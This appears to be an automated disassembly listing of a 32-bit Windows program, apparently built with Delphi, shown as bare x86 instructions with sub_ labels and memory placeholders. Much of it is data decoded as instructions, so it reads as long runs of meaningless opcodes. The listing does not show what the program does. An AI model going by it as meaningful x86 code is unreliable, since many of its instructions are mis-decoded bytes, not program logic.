call sub_405cc8
lea eax [ eax + 0xc ]
call sub_40ccd0
mov eax rw-data
call sub_40ccd0
mov eax rw-data
call sub_405598
mov eax sub_41a450
call sub_405434
mov eax rw-data
call sub_40ccd0
call sub_419210
mov eax rw-data
call sub_40ccd0
mov eax rw-data
call sub_405598
sub_41a6c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a751
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a758
retn
call sub_4191dc
mov eax sub_41a450
call sub_40542c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ca10
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4055b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_412a04
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b2c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b2c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a75c
push esi
inc esi
add [ eax + 0x640000ff ] cl
push esi
inc esi
add [ ecx + 0x640000ff ] cl
push esi
inc esi
add [ edx + 0x640000ff ] cl
push esi
inc esi
add [ ebx + 0x640000ff ] cl
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] cl
inc esi
add [ ebp + 0x640000ff ] cl
push esi
inc esi
add [ esi + 0x640000ff ] cl
push esi
inc esi
add [ edi + 0x640000ff ] cl
push esi
inc esi
add [ eax - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] dh
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] dh
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] bh
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] bh
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] ah
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] ah
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] ch
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] ch
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] dl
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] dl
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] bl
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] bl
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] al
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] al
add [ eax ] al
push esi
inc esi
add [ eax - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ ecx - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ edx - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ ebx - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ edi + edi * 8 ] cl
add [ esi + edx * 2 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ esi - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ edi - 0x1 ] cl
add [ eax ] al
push esi
inc esi
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] dh
push esi
inc esi
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41aa29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa30
retn
sub_41aa3c
inc eax
stosb [ edi ]
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
mov al [ 0x41aa ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0041aa ] ah
add [ eax ] al
add ah ah
insd
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp di
stosb [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
stosb [ edi ]
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x6d
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
sbb al 0xab
jae r-xdata
popad
insd
nop
jo r-xdata
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
mov [ ebx + 0xa030041 ] gs
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax ] bl
stosd [ edi ]
inc ecx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
stosd [ edi ]
inc esi
inc ecx
add [ ecx ] al
or al 0x54
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax - 0x54 ] bl
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
stosd [ edi ]
inc ecx
add [ ebx + 0x41abf4c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
mov [ ebx - 0x3f74ffbf ] ch
hlt
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60041ab ] cl
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xabdcc08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add al dh
stosd [ edi ]
inc ecx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
bound esi [ ebx + 0x53 ]
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add al 0xae
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41ac5c90
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
lodsd [ esi ]
inc ecx
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rcr [ eax ] 0xad
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov [ ebx + 0x66060041 ] ch
jae r-xdata
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
popad
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ ebp * 4 + 0x62070041 ] dl
jae r-xdata
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41ab6090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbec2 ] dl
aas
inc ecx
add [ eax - 0x43ffbec1 ] ch
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add al al
push ss
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
sbb [ ebp + 0xb030041 ] ch
push esp
inc edx
jb r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ eax ] al
sub al 0xae
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ ebx + eax * 8 + 0x41 ]
imul esp [ ebx + 0x73 ] 0xffff0001
nop
mov al 0xae
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 - 0x511fffbf ] bh
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + eax - 0x52 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 ] al
imul esp [ ebx + 0x73 ] 0x41addc90
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
outsb
je r-xdata
push esp
inc edi
jb r-xdata
rol [ ecx ] 0xf
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xad18c08b
loopne r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ebx * 8 - 0x53 ] si
inc ecx
add [ edi + edx ] dh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
fsubr [ ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
lodsd [ esi ]
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
push 0x736369
add [ ebx + 0x41ae30c0 ] cl
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
scasb [ edi ]
inc ecx
add dh dl
scasb [ edi ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
nop
salc
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
push [ eax + eax * 8 ]
inc ecx
add [ edi ] cl
jo r-xdata
inc eax
add al bl
xor [ eax ] eax
inc esp
retn
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
lodsd [ esi ]
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ebx + eax * 8 + 0x41 ] al
add [ eax - 0x57ffbec1 ] ah
aas
inc ecx
add [ eax + 0xe0041c3 ] cl
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
xor [ esi + 0xf0f0041 ] ch
dec ecx
inc ebx
push 0x65676e61
dec esi
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebp * 4 ] ch
add [ esi ] cl
jo r-xdata
sub_41afe4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov al 0x41
add [ eax + eax ] bl
add [ eax ] al
nop
lodsd [ esi ]
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x38 ] ah
inc ecx
add [ eax - 0x57ffbec1 ] ah
aas
inc ecx
add [ eax + 0x40041c8 ] cl
push esp
push eax
outsb
lea eax [ eax ]
inc esp
mov al 0x41
add [ edi ] al
add al 0x54
push eax
outsb
sub al 0xb0
inc ecx
add [ eax ] al
scasb [ edi ]
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
mov ah 0xca
inc ecx
add [ edx + ecx * 8 + 0x10041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0xaa3c0004
inc ecx
add [ eax - 0x4fffbe37 ] ch
leave
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add eax 0x74646957
push 0xb12cc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov cl 0x41
add [ eax ] bl
add [ eax ] al
add [ eax + 0x540041ad ] dl
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax ] ch

add eax [ eax ]
lodsb [ esi ]
inc ecx
add [ eax ] bl
add [ eax ] al
push [ eax - 0x36 ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0xf9a9b91 ] al
stosd [ edi ]
inc ecx
add [ edx + ecx * 8 - 0x3573ffbf ] al
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ edx + ecx * 8 - 0x3543ffbf ] dh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_41b12a
inc ecx
add [ eax - 0x57ffbec1 ] ah
aas
inc ecx
add [ eax - 0x35 ] dl
inc ecx
add [ esi ] al
push esp
inc edx
jb r-xdata
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] dl
nop
inc esp
mov cl 0x41
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add al 0x24
retn
outsd
fsubr [ gs : esi + 0xc0041 ]
add bh bh
add al 0x0
mov dl 0x41
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov dl 0x41
add [ eax ] bl
jae r-xdata
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0xc ]
mov al 0x41
add [ eax ] dl
add [ eax ] al
jmp [ eax - 0x2c ]
imul esp [ ebx + 0x73 ] 0xb1400004
inc ecx
add [ eax + eax ] dl
add bh bh
insb
aam 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
push eax
aam 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
adc al 0xb2
sub al 0xb1
inc ecx
add [ eax ] al
scasb [ edi ]
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
popad
or [ edi + 0x72 ] al
popad
jo r-xdata
mov cl 0x41
add [ edi + edx ] dh
inc ecx
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add [ eax ] al
rcl [ esi ] 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esi + ecx * 8 + 0x3fa00041 ] ah
inc ecx
add [ eax - 0x43ffbec1 ] ch
inc ecx
add [ esi + edx * 8 - 0x2987ffbf ] cl
inc ecx
add [ ebp + edx * 8 + 0x54070041 ] ch
inc ebx
popad
outsb
jbe r-xdata
or [ edx + 0x580041 ] dh
imul esp [ ebx + 0x73 ] 0xaa3c0002
inc ecx
add [ eax - 0x6fffbe34 ] cl
int3
sub_41b32c
push es
mov bl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov bl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov bl 0x41
add al ah
mov bl 0x41
add [ eax ] ch
add [ eax ] al
add [ eax + 0x54004117 ] dh
xor al 0x40
add [ eax + 0x40 ] ah
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbec2 ] dl
aas
inc ecx
add [ ebx + ebp * 8 ] ch
inc ecx
add [ esi + edi + 0x40f00041 ] bh
inc ecx
add [ edx + ebp * 8 + 0x2a680041 ] bh
inc eax
add [ eax - 0x15 ] bh
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add al al
in al dx
inc ecx
add ah al
in al dx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ ebp + ebp * 8 + 0x41 ] al
add [ eax + 0x2a ] ch
inc eax
add [ eax - 0x53ffbe13 ] ch
in eax dx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ ebp + ebp * 8 - 0x157bffbf ] bh
inc ecx
add al cl
in al dx
inc ecx
add [ eax - 0x13 ] dl
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ ecx ] al
add ch bh
[ ebp * 8 + 0x54080041 ]
inc edi
jb r-xdata
inc eax
jo r-xdata
jmp r-xdata
inc ecx
add ah dl
add [ edx ] eax
mov [ edx ] al
inc edx
add al cl
add al [ edx ]
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ esp + edx * 2 ] cl
imul esp [ ebx - 0x73 ] 0xb3f00040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
sub ah bh
inc ecx
add al cl
in al dx
inc ecx
add [ eax - 0x13 ] dl
inc ecx
add ah ch
add eax 0x13c80042
inc edx
add [ eax + 0x5 ] ch
inc edx
add al dl
adc eax [ edx ]
cmp [ edx ] al
inc edx
add [ eax - 0x2bffbdfe ] bl
or eax 0x54070042
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b59870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b51c70
add ah ch
mov bl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
mov esp 0x41b4
or al 0x54
imul esp [ ebx + 0x74 ] 0x340041b3
sbb [ ecx ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
popad
nop
pushad
mov dh 0x41
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov ah 0x41
add [ eax + eax ] dh
add [ eax ] dl
mov ah 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + esi * 8 - 0xdffffbf ] ah
inc ecx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
sbb al 0xb5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b5 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 4 + 0x3c0041 ] cl
add [ eax ] al
sub [ ebx + 0x34540041 ] dh
inc eax
add [ eax + 0x40 ] ah
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbe04 ] dl
aas
inc ecx
add [ ebx + ebp * 8 ] ch
inc ecx
add ah cl
cld
inc ecx
add al dh
inc eax
inc ecx
add [ eax + 0x200041fe ] ah
inc [ ecx ]
js r-xdata
inc ecx
add [ eax ] al
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
imul esp [ ebx + 0x73 ] 0x5c900000
mov ah 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] ah
